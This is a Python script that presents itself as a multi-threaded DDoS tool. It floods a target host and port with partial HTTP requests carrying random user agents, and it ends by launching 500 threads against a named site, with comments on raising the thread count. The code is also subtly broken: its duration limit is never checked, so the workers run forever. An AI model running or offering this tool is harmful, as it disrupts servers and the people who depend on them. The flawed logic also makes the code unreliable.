import socket
import random
import time
import threading

# Function to generate random IP addresses
def generate_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

# Function to generate random user agents
def generate_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38",
        # Add more user agents as needed
    ]
    return random.choice(user_agents)

# Function to perform the DDoS attack using multi-threading
def ddos_attack(target_ip, target_port, duration, num_threads):
    # Calculate the end time based on the duration
    end_time = time.time() + duration

    # Create a semaphore for rate limiting
    semaphore = threading.Semaphore(100)

    def thread_worker():
        while True:
            semaphore.acquire()

            try:
                # Create a socket object
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)

                # Connect to the target IP and port
                s.connect((target_ip, target_port))

                # Send a fake HTTP request with a random user agent
                s.sendto(("GET /{} HTTP/1.1\r\n").format(generate_ip()).encode('ascii'), (target_ip, target_port))
                s.sendto(("User-Agent: {}\r\n").format(generate_user_agent()).encode('ascii'), (target_ip, target_port))
                s.sendto(b"Accept-language: en-US,en,q=0.5\r\n", (target_ip, target_port))

                # Close the socket
                s.close()

                # Print the status of the attack
                print(f"Sent request to {target_ip}:{target_port}")
            except socket.error as e:
                print(f"Error: {e}")

            semaphore.release()
            time.sleep(0.01)  # Add a short sleep to prevent spamming the server

    # Create worker threads
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=thread_worker)
        thread.start()
        threads.append(thread)

    # Wait for the threads to finish
    for thread in threads:
        thread.join()


# Example usage:
# Replace 'testphp.vulnweb.com' with the target IP and 80 with the target port.
# Set the duration to the number of seconds you want the attack to run.
# Increase num_threads to increase the number of concurrent requests.
ddos_attack('testphp.vulnweb.com',80, 100, 500)